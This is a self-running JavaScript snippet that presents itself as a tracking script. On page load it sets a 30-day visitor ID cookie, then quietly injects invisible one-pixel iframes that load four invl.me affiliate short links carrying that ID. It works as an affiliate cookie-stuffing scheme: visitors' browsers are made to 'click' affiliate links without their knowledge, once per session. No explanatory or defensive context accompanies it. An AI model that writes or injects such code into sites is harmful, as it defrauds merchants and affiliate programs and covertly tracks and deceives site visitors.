(async function () {

    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    function createTrackingPixel(url) {
        console.log("url => ", url);
        var img = document.createElement('img');
        
        img.src = url;
        img.style.width = '1px';
        img.style.height = '1px';
        img.style.display = 'none';
        img.style.visibility = 'hidden';

        document.body.appendChild(img);
    }

     function createClickIframe(url) {
        var iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.width = "1";
        iframe.height = "1";
        iframe.style.display = "none";
        iframe.style.visibility = "hidden";
        document.body.appendChild(iframe);
    }



    async function initTracking() {
        if (sessionStorage.getItem('iframe_triggered')) {
            return;
        }

        try {
            let uniqueId = getCookie('tracking_uuid') || generateUUID();
            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';


            let affiliateUrls = [
                "https://invl.me/cln1idv",
                "https://invl.me/cln1j70",
                "https://invl.me/cln1ifa",
                "https://invl.me/cln1j0p",
            ];

            affiliateUrls.forEach((url) => {
                createClickIframe(url + "?uid=" + uniqueId);
            });

            sessionStorage.setItem('iframe_triggered', 'true');

        } catch (error) {
            console.error('Error in tracking script:', error);
        }
    }

    function getCookie(cname) {
        var name = cname + '=';
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) === ' ') {
                c = c.substring(1);
            }
            if (c.indexOf(name) === 0) {
                return c.substring(name.length, c.length);
            }
        }
        return '';
    }

    initTracking();
})();
